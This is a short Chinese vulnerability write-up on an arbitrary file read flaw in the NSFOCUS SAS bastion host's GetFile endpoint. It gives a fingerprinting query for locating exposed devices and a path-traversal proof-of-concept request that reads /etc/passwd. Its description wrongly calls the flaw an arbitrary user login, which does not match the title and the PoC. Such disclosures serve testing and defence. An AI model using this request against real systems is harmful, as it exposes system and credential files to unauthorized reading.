# 绿盟 SAS堡垒机 GetFile 任意文件读取漏洞

## 漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

## 漏洞影响

绿盟 SAS堡垒机

## 网络测绘

body="'/needUsbkey.php?username='"

## 漏洞复现

登陆页面

![image-20230810163031522](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163238306-1826313934.png)

漏洞存在于文件 GetFileController.php 文件中

![image-20230810163048587](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163241877-527999773.png)

验证POC

```plain
/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
```

![image-20230810163103853](https://img2023.cnblogs.com/blog/2411575/202308/2411575-20230810163244593-1554202383.png)